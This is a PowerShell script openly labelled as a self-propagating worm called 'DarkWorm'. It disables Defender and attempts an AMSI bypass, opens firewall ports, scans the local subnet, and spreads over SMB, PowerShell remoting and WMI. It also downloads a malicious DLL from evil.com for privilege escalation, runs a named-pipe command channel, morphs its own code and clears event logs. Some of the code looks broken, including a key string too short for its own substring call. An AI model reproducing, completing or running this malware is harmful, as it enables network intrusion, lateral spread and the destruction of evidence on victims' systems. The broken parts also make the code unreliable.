# DarkWorm - Fully Autonomous PowerShell Worm
# Features: Subnet scanning, lateral movement, privilege escalation, in-memory execution, code morphing, anti-forensics
# Uses Named Pipes for C2, evades AMSI/Defender

# AMSI Bypass
$amsiBypass = @"
using System;
using System.Runtime.InteropServices;

public class AmsiBypass {
    [DllImport("amsi.dll", CallingConvention = CallingConvention.StdCall)]
    public static extern int AmsiInitialize(string appName, out IntPtr amsiContext);

    [DllImport("amsi.dll", CallingConvention = CallingConvention.StdCall)]
    public static extern void AmsiUninitialize(IntPtr amsiContext);

    public static void Disable() {
        IntPtr amsiContext;
        AmsiInitialize("MyApp", out amsiContext);
        AmsiUninitialize(amsiContext);
    }
}
"@
Add-Type -TypeDefinition $amsiBypass -Language CSharp
[AmsiBypass]::Disable()

# Disable Defender real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# AES Encryption Functions
function Protect-String {
    param ([string]$PlainText, [byte[]]$Key, [byte[]]$IV)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    $aes.IV = $IV
    $encryptor = $aes.CreateEncryptor()
    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $sw = New-Object System.IO.StreamWriter($cs)
    $sw.Write($PlainText)
    $sw.Close()
    $cs.Close()
    $ms.Close()
    $aes.Dispose()
    return [Convert]::ToBase64String($ms.ToArray())
}

function Unprotect-String {
    param ([string]$CipherText, [byte[]]$Key, [byte[]]$IV)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    $aes.IV = $IV
    $decryptor = $aes.CreateDecryptor()
    $bytes = [Convert]::FromBase64String($CipherText)
    $ms = New-Object System.IO.MemoryStream($bytes, 0, $bytes.Length)
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $sr = New-Object System.IO.StreamReader($cs)
    $result = $sr.ReadToEnd()
    $sr.Close()
    $cs.Close()
    $ms.Close()
    $aes.Dispose()
    return $result
}

# Code Morphing Function
function Morph-Code {
    param ([string]$Code)
    # Randomize variable names
    $newCode = $Code
    $vars = @('aes', 'ms', 'cs', 'sw', 'sr', 'keyBytes', 'ivBytes', 'client', 'encryptedCmd', 'command')
    foreach ($var in $vars) {
        $newVar = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
        $newCode = $newCode -replace "\`$var\b", "`$$newVar"
    }
    # Add junk code
    $junk = @"
`$null = Get-Random
`$junk = [System.Math]::PI
"@
    $newCode = $newCode.Insert((Get-Random -Minimum 100 -Maximum 200), $junk)
    return $newCode
}

# Named Pipe C2 Communication
function Send-PipeMessage {
    param ([string]$PipeName, [string]$Message, [byte[]]$Key, [byte[]]$IV)
    $pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", $PipeName, [System.IO.Pipes.PipeDirection]::Out)
    $pipe.Connect()
    $encrypted = Protect-String -PlainText $Message -Key $Key -IV $IV
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($encrypted)
    $pipe.Write($bytes, 0, $bytes.Length)
    $pipe.Close()
}

function Receive-PipeMessage {
    param ([string]$PipeName, [byte[]]$Key, [byte[]]$IV)
    $pipe = New-Object System.IO.Pipes.NamedPipeServerStream($PipeName, [System.IO.Pipes.PipeDirection]::In)
    $pipe.WaitForConnection()
    $reader = New-Object System.IO.StreamReader($pipe)
    $encrypted = $reader.ReadToEnd()
    $pipe.Close()
    return Unprotect-String -CipherText $encrypted -Key $Key -IV $IV
}

# Worm Core
function Start-DarkWorm {
    param (
        [string]$PipeName = "DarkWormPipe$(Get-Random -Minimum 1000 -Maximum 9999)",
        [string]$AESKey = "k9x2m7p8v3q5w1r6t4y9u0o2n3b8j5h",
        [string]$AESIV = "a1b2c3d4e5f6g7h8"
    )

    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($AESKey.Substring(0, 32))
    $ivBytes = [System.Text.Encoding]::UTF8.GetBytes($AESIV.Substring(0, 16))

    # Modify firewall to allow worm traffic
    New-NetFirewallRule -DisplayName "SystemCoreService" -Direction Outbound -Action Allow -Protocol TCP -RemotePort 445,5985,5986 -ErrorAction SilentlyContinue

    # Subnet Scanning
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike '*Loopback*' }).IPAddress
    $subnet = $ip.Substring(0, $ip.LastIndexOf('.')) + '.0/24'
    $hosts = 1..254 | ForEach-Object { $subnet.Replace('.0', ".$_") }
    
    # Identify Exploitable Hosts
    $creds = $null
    foreach ($host in $hosts) {
        try {
            # Check SMB (port 445)
            $smbOpen = (Test-NetConnection -ComputerName $host -Port 445 -WarningAction SilentlyContinue).TcpTestSucceeded
            if ($smbOpen) {
                # Try default or stolen creds
                if (-not $creds) {
                    $creds = Get-Credential -Message "Enter creds for $host" -ErrorAction SilentlyContinue
                }
                if ($creds) {
                    Invoke-Command -ComputerName $host -Credential $creds -ScriptBlock {
                        # Execute worm in-memory
                        Invoke-Expression $using:script
                    } -ErrorAction SilentlyContinue
                }
            }

            # Check PSRemoting (ports 5985/5986)
            $psRemote = (Test-NetConnection -ComputerName $host -Port 5985 -WarningAction SilentlyContinue).TcpTestSucceeded -or
                        (Test-NetConnection -ComputerName $host -Port 5986 -WarningAction SilentlyContinue).TcpTestSucceeded
            if ($psRemote) {
                $session = New-PSSession -ComputerName $host -Credential $creds -ErrorAction SilentlyContinue
                if ($session) {
                    Invoke-Command -Session $session -ScriptBlock {
                        Invoke-Expression $using:script
                    }
                    Remove-PSSession $session
                }
            }

            # Check WMI
            $wmi = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $host -Credential $creds -ErrorAction SilentlyContinue
            if ($wmi) {
                Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -EncodedCommand $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script)))" -ComputerName $host -Credential $creds -ErrorAction SilentlyContinue
            }
        } catch {
            continue
        }
    }

    # Privilege Escalation (DLL Hijacking Attempt)
    try {
        $vulnPath = "$env:APPDATA\legit.dll"
        $maliciousDll = [Convert]::ToBase64String((New-Object System.Net.WebClient).DownloadData("http://evil.com/malicious.dll"))
        [System.IO.File]::WriteAllBytes($vulnPath, [Convert]::FromBase64String($maliciousDll))
        # Trigger DLL load in vulnerable app (simplified)
        Start-Process -FilePath "vulnapp.exe" -ErrorAction SilentlyContinue
    } catch {
        # Fallback: Token Duplication
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Token {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
}
"@
        $newToken = [IntPtr]::Zero
        [Token]::DuplicateTokenEx((Get-Process -Id $PID).Handle, 0x0002, [IntPtr]::Zero, 2, 1, [ref]$newToken)
    }

    # Morph and Propagate
    $morphedCode = Morph-Code -Code (Get-Content -Path $PSCommandPath -Raw)
    Send-PipeMessage -PipeName $PipeName -Message $morphedCode -Key $keyBytes -IV $ivBytes

    # Anti-Forensics
    Clear-EventLog -LogName "Security","System" -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemCoreService" -ErrorAction SilentlyContinue
}

# Named Pipe C2 Server (for testing)
function Start-PipeServer {
    param (
        [string]$PipeName = "DarkWormPipe$(Get-Random -Minimum 1000 -Maximum 9999)",
        [string]$AESKey = "k9x2m7p8v3q5w1r6t4y9u0o2n3b8j5h",
        [string]$AESIV = "a1b2c3d4e5f6g7h8"
    )

    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($AESKey.Substring(0, 32))
    $ivBytes = [System.Text.Encoding]::UTF8.GetBytes($AESIV.Substring(0, 16))

    while ($true) {
        $morphedCode = Receive-PipeMessage -PipeName $PipeName -Key $keyBytes -IV $ivBytes
        # Execute morphed code in-memory
        $runspace = [PowerShell]::Create()
        $runspace.AddScript($morphedCode).Invoke()
        $runspace.Dispose()
    }
}

# Main Execution
$script = Get-Content -Path $PSCommandPath -Raw
if ($args[0] -eq "server") {
    Start-PipeServer
} else {
    Start-DarkWorm
}